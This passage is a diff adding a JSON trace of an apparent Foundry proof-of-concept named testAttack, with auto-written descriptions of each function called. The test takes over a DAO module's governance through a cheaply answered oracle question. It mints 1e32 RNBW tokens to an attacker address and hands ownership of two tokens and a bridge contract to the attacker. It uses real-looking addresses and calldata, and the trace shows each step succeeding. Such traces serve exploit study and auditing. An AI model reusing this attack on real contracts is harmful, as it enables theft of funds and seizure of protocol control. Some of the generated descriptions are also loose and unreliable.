@@ -1,0 +1,310 @@
+[
+    {
+        "id": "941295",
+        "args": "",
+        "original_code": "    function testAttack() public {\n        // tx to mint 100,000,000,000,000 RNBW tokens\n        bytes32 tx0 = DAO_MODULE.getTransactionHash(\n            address(RNBW_TOKEN),\n            0,\n            encodeWithSignature_mint(ATTACKER_EOA, 100_000_000_000_000_000_000_000_000_000_000),\n            //hex\"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000\",\n            Enum.Operation(0),\n            0\n        );\n\n        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx1 = DAO_MODULE.getTransactionHash(\n            address(RNBW_TOKEN),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            1\n        );\n\n        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx2 = DAO_MODULE.getTransactionHash(\n            address(LPOP_TOKEN),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            2\n        );\n\n        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx3 = DAO_MODULE.getTransactionHash(\n            address(PRIMARY_BRIDGE),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            3\n        );\n\n        // the txIDs generated using getTransactionHash()\n        bytes32[] memory txIDs = new bytes32[](4);\n        txIDs[0] = tx0;\n        txIDs[1] = tx1;\n        txIDs[2] = tx2;\n        txIDs[3] = tx3;\n\n        DAO_MODULE.addProposal(\"2\", txIDs);\n        string memory q = DAO_MODULE.buildQuestion(\"2\", txIDs);\n        bytes32 qID = DAO_MODULE.questionIds(keccak256(bytes(q)));\n        REALITIO.submitAnswer{value: 1}(qID, bytes32(uint256(1)), 0);\n\n        vm.warp(block.timestamp + 24 * 60 * 60);\n\n        emit log_named_address(\"[Before proposal Execution] Owner of $RNBW: \", RNBW_TOKEN.owner());\n        emit log_named_address(\"[Before proposal Execution] Owner of $LPOP: \", LPOP_TOKEN.owner());\n        emit log_named_address(\"[Before proposal Execution] Owner of PrimaryBridge: \", PRIMARY_BRIDGE.owner());\n        emit log_named_decimal_uint(\n            \"[Before proposal Execution] Attacker's $RNBW Token Balance: \", RNBW_TOKEN.balanceOf(ATTACKER_EOA), 18\n        );\n\n        vm.startPrank(ATTACKER_CONTRACT);\n\n        // Execute mint 100,000,000,000,000 RNBW tokens\n        DAO_MODULE.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            address(RNBW_TOKEN),\n            0,\n            encodeWithSignature_mint(ATTACKER_EOA, 100_000_000_000_000_000_000_000_000_000_000),\n            //hex\"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000\",\n            Enum.Operation(0),\n            0\n        );\n\n        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        DAO_MODULE.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            address(RNBW_TOKEN),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            1\n        );\n\n        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        DAO_MODULE.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            address(LPOP_TOKEN),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            2\n        );\n\n        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        DAO_MODULE.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            address(PRIMARY_BRIDGE),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            3\n        );\n\n        vm.stopPrank();\n\n        emit log_string(\"--------------------------------------------------------------\");\n        emit log_named_address(\"[After proposal Execution] Owner of $RNBW: \", RNBW_TOKEN.owner());\n        emit log_named_address(\"[After proposal Execution] Owner of $LPOP: \", LPOP_TOKEN.owner());\n        emit log_named_address(\"[After proposal Execution] Owner of PrimaryBridge: \", PRIMARY_BRIDGE.owner());\n        emit log_named_decimal_uint(\n            \"[After proposal Execution] Attacker's $RNBW Token Balance: \", RNBW_TOKEN.balanceOf(ATTACKER_EOA), 18\n        );\n    }\n",
+        "description": "1. **Core functions**:  \nThe `testAttack` function is designed to simulate an attack on a decentralized system. It performs several actions:  \n- It creates a proposal to mint a massive amount of RNBW tokens (100,000,000,000,000) and assigns them to the attacker's address.  \n- It transfers ownership of three different assets (RNBW_TOKEN, LPOP_TOKEN, and PRIMARY_BRIDGE) to the attacker's address.  \n- It submits the proposal to a DAO (Decentralized Autonomous Organization) module and executes it after a 24-hour delay.  \n- Finally, it logs the results before and after the execution of the proposal to show the changes in ownership and token balances.  \n\n2. **Security mechanism**:  \nThe function does not include explicit security mechanisms to prevent unauthorized access or misuse. Instead, it relies on the DAO_MODULE to handle the proposal and execution process. However, the function uses `vm.startPrank` and `vm.stopPrank` to simulate the attacker's contract as the caller during execution, which could bypass certain security checks if not properly implemented in the DAO_MODULE.  \n\n3. **Parameter Function**:  \nThe function does not take any external parameters. However, it uses predefined constants and addresses (e.g., `ATTACKER_EOA`, `RNBW_TOKEN`, `LPOP_TOKEN`, `PRIMARY_BRIDGE`) to specify the target of the attack. These values are hardcoded into the function, meaning the attack is tailored to specific addresses and tokens.  \n\n4. **Return description**:  \nThe function does not return any value. Instead, it emits logs to display the state of the system before and after the attack. These logs include the ownership of the tokens and the attacker's RNBW token balance, which helps to verify the success of the attack.  \n\n**In summary**, the `testAttack` function simulates an attack on a decentralized system by minting a large number of tokens and transferring ownership of assets to the attacker. It relies on the DAO_MODULE to handle the proposal and execution process but lacks built-in security measures to prevent misuse. The function uses hardcoded addresses and emits logs to show the results of the attack.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "4245",
+        "args": "RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0x40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000, 0, 0",
+        "original_code": "    function getTransactionHash(address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 nonce) public view returns(bytes32) {\n        return keccak256(generateTransactionHashData(to, value, data, operation, nonce));\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The main purpose of this function is to create a unique identifier (hash) for a transaction. This identifier is generated based on the details of the transaction, such as the recipient address, the amount of value being sent, the data involved, the type of operation, and a unique number (nonce). This hash helps ensure that each transaction is distinct and can be securely tracked or verified.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the blockchain, making it safe to call without incurring gas costs. Additionally, the use of `keccak256` (a cryptographic hash function) ensures that the transaction hash is unique and tamper-proof, providing a layer of security against fraud or manipulation.\n\n3. **Parameter Function**:  \n   - `to`: The address of the recipient of the transaction.  \n   - `value`: The amount of value (e.g., Ether) being sent in the transaction.  \n   - `data`: Additional information or instructions associated with the transaction.  \n   - `operation`: The type of operation being performed (e.g., a call or a delegate call).  \n   - `nonce`: A unique number that ensures the transaction hash is unique, even if other details are the same.  \n\n4. **Return description**:  \n   The function returns a unique hash value calculated using the `keccak256` function. This hash is generated by combining all the transaction details (to, value, data, operation, and nonce) into a single, secure representation. The hash serves as a fingerprint for the transaction, ensuring its integrity and uniqueness.  \n\nIn summary, this function generates a secure and unique identifier for a transaction based on its details, using cryptographic hashing to ensure safety and reliability.",
+        "return_value": "0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a"
+    },
+    {
+        "id": "4233",
+        "args": "RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca"
+    },
+    {
+        "id": "4233",
+        "args": "LPOP_TOKEN: [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 2",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d"
+    },
+    {
+        "id": "4233",
+        "args": "PRIMARY_BRIDGE: [0x579270F151D142eb8BdC081043a983307Aa15786], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 3",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293"
+    },
+    {
+        "id": "173944",
+        "args": "\"2\", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293]",
+        "original_code": "    function addProposal(string memory proposalId, bytes32[] memory txHashes) public {\n        addProposalWithNonce(proposalId, txHashes, 0);\n    }\n\n    /// @dev Function to add a proposal that should be considered for execution\n    /// @param proposalId Id that should identify the proposal uniquely\n    /// @param txHashes EIP-712 hashes of the transactions that should be executed\n    /// @param nonce Nonce that should be used when asking the question on the oracle\n    function addProposalWithNonce(string memory proposalId, bytes32[] memory txHashes, uint256 nonce) public {\n        // We load some storage variables into memory to save gas\n        uint256 templateId = template;\n        uint32 timeout = questionTimeout;\n        address arbitrator = questionArbitrator;\n        // We generate the question string used for the oracle\n        string memory question = buildQuestion(proposalId, txHashes);\n        bytes32 questionHash = keccak256(bytes(question));\n        if (nonce > 0) {\n            // Previous nonce must have been invalidated by the oracle.\n            // However, if the proposal was internally invalidated, it should not be possible to ask it again.\n            bytes32 currentQuestionId = questionIds[questionHash];\n            require(currentQuestionId != INVALIDATED, \"This proposal has been marked as invalid\");\n            require(oracle.resultFor(currentQuestionId) == INVALIDATED, \"Previous proposal was not invalidated\");\n        } else {\n            require(questionIds[questionHash] == bytes32(0), \"Proposal has already been submitted\");\n        }\n        bytes32 expectedQuestionId = getQuestionId(\n            templateId, question, arbitrator, timeout, 0, nonce\n        );\n        // Set the question hash for this quesion id\n        questionIds[questionHash] = expectedQuestionId;\n        // Ask the question with a starting time of 0, so that it can be immediately answered\n        bytes32 questionId = oracle.askQuestion(templateId, question, arbitrator, timeout, 0, nonce);\n        require(expectedQuestionId == questionId, \"Unexpected question id\");\n        emit ProposalQuestionCreated(questionId, proposalId);\n    }\n\n    /// @dev Marks a proposal as invalid, preventing execution of the connected transactions\n    /// @param proposalId Id that should identify the proposal uniquely\n    /// @param txHashes EIP-712 hashes of the transactions that should be executed\n    /// @notice This can only be called by the executor\n",
+        "description": "1. Core functions:\n   The code defines two functions, `addProposal` and `addProposalWithNonce`, which are used to add a new proposal for consideration. The `addProposal` function is a simplified version that calls `addProposalWithNonce` with a default nonce value of 0. The `addProposalWithNonce` function handles the creation of a proposal by generating a unique question string, checking for validity, and interacting with an oracle to register the proposal. It also emits an event to notify that a proposal question has been created.\n\n2. Security mechanism:\n   The code includes several security checks to ensure the integrity of the proposal process. It uses `require` statements to enforce conditions such as ensuring that a proposal has not already been submitted (`questionIds[questionHash] == bytes32(0)`), that a previous proposal was invalidated (`oracle.resultFor(currentQuestionId) == INVALIDATED`), and that the generated question ID matches the expected one (`expectedQuestionId == questionId`). These checks help prevent duplicate proposals, invalid proposals, and unexpected behavior.\n\n3. Parameter Function:\n   - `proposalId`: A unique identifier for the proposal.\n   - `txHashes`: An array of transaction hashes that are part of the proposal.\n   - `nonce`: A value used to ensure the uniqueness of the proposal question, especially when retrying after invalidation.\n\n4. Return description:\n   The functions do not return any value directly. Instead, they interact with an oracle to register a proposal question and emit an event (`ProposalQuestionCreated`) to indicate that a new proposal question has been created. The event includes the generated `questionId` and the `proposalId` for tracking and verification purposes.\n\nIn summary, the code is designed to add and manage proposals securely by generating unique questions, validating inputs, and interacting with an oracle to ensure the integrity of the proposal process.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "63053",
+        "args": "18, \"2\u241f78c41ba3945a5b26aacff77931bde687b1409cfa5b3000c8f5315c191d01626e\", XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E], 1, 0, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e"
+    },
+    {
+        "id": "75777",
+        "args": "\"2\", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293]",
+        "original_code": "    function buildQuestion(string memory proposalId, bytes32[] memory txHashes) public pure returns(string memory) {\n        string memory txsHash = bytes32ToAsciiString(keccak256(abi.encodePacked(txHashes)));\n        return string(abi.encodePacked(proposalId, bytes3(0xe2909f), txsHash));\n    }\n\n    /// @dev Generate the question id.\n    /// @notice It is required that this is the same as for the oracle implementation used.\n",
+        "description": "1. Core functions:  \nThe `buildQuestion` function is designed to create a unique question identifier by combining a proposal ID and a list of transaction hashes. It first calculates a single hash from the list of transaction hashes and then merges this hash with the proposal ID to form the final question identifier. This is useful in scenarios where a unique identifier is needed to reference a specific proposal and its associated transactions.\n\n2. Security mechanism:  \nThe function uses the `pure` modifier, which ensures that it does not read or modify the state of the contract. This makes the function safe from potential state-related vulnerabilities. Additionally, the function relies on cryptographic hashing (`keccak256`) to securely process the transaction hashes, ensuring the integrity and uniqueness of the generated question identifier.\n\n3. Parameter Function:  \n- `proposalId`: This is a string that represents the unique identifier of a proposal. It is used as part of the final question identifier.  \n- `txHashes`: This is an array of transaction hashes (represented as `bytes32` values). These hashes are combined and hashed again to create a single, unique value that is included in the final question identifier.  \n\n4. Return description:  \nThe function returns a string that is created by concatenating the `proposalId`, a special separator (`bytes3(0xe2909f)`), and the hashed value of the transaction hashes (`txsHash`). This combined string serves as the unique question identifier, ensuring that it is both specific to the proposal and tied to the associated transactions.  \n\nIn summary,  \nThe `buildQuestion` function generates a unique question identifier by combining a proposal ID and a list of transaction hashes. It uses cryptographic hashing to ensure the integrity of the output and is designed to be secure and stateless. The resulting identifier is a concatenation of the proposal ID, a separator, and the hashed transaction data.",
+        "return_value": "\"2\u241f78c41ba3945a5b26aacff77931bde687b1409cfa5b3000c8f5315c191d01626e\""
+    },
+    {
+        "id": "831",
+        "args": "0x92534724248061d1f29181141cb70fd1e0eac6128f17d0b77e9631718e2aa613",
+        "original_code": "",
+        "description": "",
+        "return_value": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e"
+    },
+    {
+        "id": "0",
+        "args": "1665334931 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2661",
+        "args": "",
+        "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to retrieve and return the address of the current owner of the contract. It is a simple read-only function that provides access to the `_owner` variable, which typically stores the address of the entity or person who deployed or controls the contract.\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract, making it safe to call without incurring gas costs. It is also marked as `public`, meaning it can be accessed by anyone, and `virtual`, allowing it to be overridden by derived contracts if needed.\n\n3. **Parameter Function:**  \n   This function does not take any parameters. Its sole purpose is to fetch and return the value of the `_owner` variable.\n\n4. **Return description:**  \n   The function returns the value stored in the `_owner` variable, which is an address. This address represents the owner of the contract, as defined when the contract was deployed or updated.\n\n**In summary,**  \nThis function is a straightforward way to access the owner's address of the contract. It is secure, does not modify the contract's state, and can be overridden if necessary. It does not require any input parameters and simply returns the address of the owner.",
+        "return_value": "XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E]"
+    },
+    {
+        "id": "2494",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E]"
+    },
+    {
+        "id": "2611",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "XAVE_GNOSIS_SAFE_MULTISIG: [0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E]"
+    },
+    {
+        "id": "2864",
+        "args": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "ATTACKER_CONTRACT: [0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "152018",
+        "args": "\"2\", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293], RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0x40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000, 0, 0",
+        "original_code": "    function executeProposalWithIndex(string memory proposalId, bytes32[] memory txHashes, address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 txIndex) public {\n        // We use the hash of the question to check the execution state, as the other parameters might change, but the question not\n        bytes32 questionHash = keccak256(bytes(buildQuestion(proposalId, txHashes)));\n        // Lookup question id for this proposal\n        bytes32 questionId = questionIds[questionHash];\n        // Question hash needs to set to be eligible for execution\n        require(questionId != bytes32(0), \"No question id set for provided proposal\");\n        require(questionId != INVALIDATED, \"Proposal has been invalidated\");\n\n        bytes32 txHash = getTransactionHash(to, value, data, operation, txIndex);\n        require(txHashes[txIndex] == txHash, \"Unexpected transaction hash\");\n\n        // Check that the result of the question is 1 (true)\n        require(oracle.resultFor(questionId) == bytes32(uint256(1)), \"Transaction was not approved\");\n        uint256 minBond = minimumBond;\n        require(minBond == 0 || minBond <= oracle.getBond(questionId), \"Bond on question not high enough\");\n        uint32 finalizeTs = oracle.getFinalizeTS(questionId);\n        // The answer is valid in the time after the cooldown and before the expiration time (if set).\n        require(finalizeTs + uint256(questionCooldown) < block.timestamp, \"Wait for additional cooldown\");\n        uint32 expiration = answerExpiration;\n        require(expiration == 0 || finalizeTs + uint256(expiration) >= block.timestamp, \"Answer has expired\");\n        // Check this is either the first transaction in the list or that the previous question was already approved\n        require(txIndex == 0 || executedProposalTransactions[questionHash][txHashes[txIndex - 1]], \"Previous transaction not executed yet\");\n        // Check that this question was not executed yet\n        require(!executedProposalTransactions[questionHash][txHash], \"Cannot execute transaction again\");\n        // Mark transaction as executed\n        executedProposalTransactions[questionHash][txHash] = true;\n        // Execute the transaction via the executor.\n        require(executor.execTransactionFromModule(to, value, data, operation), \"Module transaction failed\");\n    }\n\n    /// @dev Build the question by combining the proposalId and the hex string of the hash of the txHashes\n    /// @param proposalId Id of the proposal that proposes to execute the transactions represented by the txHashes\n    /// @param txHashes EIP-712 Hashes of the transactions that should be executed\n",
+        "description": "1. Core functions:  \nThe main purpose of this function is to execute a specific transaction from a proposal after ensuring it meets all necessary conditions. It checks if the proposal is valid, if the transaction is approved, and if all prerequisites (like cooldown periods and bond requirements) are satisfied. If everything is in order, the transaction is executed using a designated executor.\n\n2. Security mechanism:  \nThe function includes several checks to ensure security:  \n- It verifies that the proposal has a valid question ID and hasn\u2019t been invalidated.  \n- It ensures the transaction hash matches the expected one.  \n- It confirms the transaction was approved by an oracle.  \n- It checks if the bond (a form of security deposit) meets the minimum requirement.  \n- It enforces cooldown and expiration periods to prevent premature or outdated executions.  \n- It ensures previous transactions in the sequence were executed before proceeding.  \n- It prevents re-execution of the same transaction.  \n\n3. Parameter Function:  \n- `proposalId`: Identifies the specific proposal being executed.  \n- `txHashes`: A list of transaction hashes associated with the proposal.  \n- `to`: The address where the transaction is being sent.  \n- `value`: The amount of cryptocurrency being sent in the transaction.  \n- `data`: Additional information or instructions for the transaction.  \n- `operation`: Specifies the type of operation (e.g., call or delegate call).  \n- `txIndex`: Indicates the position of the transaction in the list of `txHashes`.  \n\n4. Return description:  \nThe function does not return a value directly. Instead, it executes a transaction if all checks pass. If any condition fails, the function stops and throws an error with a specific message explaining the issue.  \n\nIn summary, this function ensures a transaction from a proposal is executed only after thorough validation, incorporating multiple security measures to prevent unauthorized or invalid actions.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "1627",
+        "args": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "1130",
+        "args": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000006341ad14"
+    },
+    {
+        "id": "38346",
+        "args": "RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0x40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "33473",
+        "args": "RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0x40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "28822",
+        "args": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2], 100000000000000000000000000000000 [1e32]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "118368",
+        "args": "\"2\", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293], RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1627",
+        "args": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "1130",
+        "args": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000006341ad14"
+    },
+    {
+        "id": "8753",
+        "args": "RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "8386",
+        "args": "RNBW_TOKEN: [0xE94B97b6b43639E238c851A7e693F50033EfD75C], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "5741",
+        "args": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "118147",
+        "args": "\"2\", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293], LPOP_TOKEN: [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 2",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1627",
+        "args": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "1130",
+        "args": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000006341ad14"
+    },
+    {
+        "id": "8532",
+        "args": "LPOP_TOKEN: [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "8165",
+        "args": "LPOP_TOKEN: [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "5520",
+        "args": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "118171",
+        "args": "\"2\", [0x920be15788d94a0bee09f9f7bcbdad2e47ef4a59f684d9bb06b657083e576c0a, 0xa76f7716abd0c04dcd5e627b349fea606f0133d93ce8381d450e976b6ef7b9ca, 0xe99095062d9e0d131e25a230c8a84345b37b979bd6f7b0b9e1850a0847339b6d, 0x14f07b03beee17f568bdb8627c3a521b1a7c99cd7abcafec9a015d93c3fb9293], PRIMARY_BRIDGE: [0x579270F151D142eb8BdC081043a983307Aa15786], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0, 3",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1627",
+        "args": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "1130",
+        "args": "0x00b085265e9c3dd5070453c6a625285263dd087938b50b89d2b45390c9558b1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000006341ad14"
+    },
+    {
+        "id": "8556",
+        "args": "PRIMARY_BRIDGE: [0x579270F151D142eb8BdC081043a983307Aa15786], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "8189",
+        "args": "PRIMARY_BRIDGE: [0x579270F151D142eb8BdC081043a983307Aa15786], 0, 0xf2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "5544",
+        "args": "ATTACKER_EOA: [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "661",
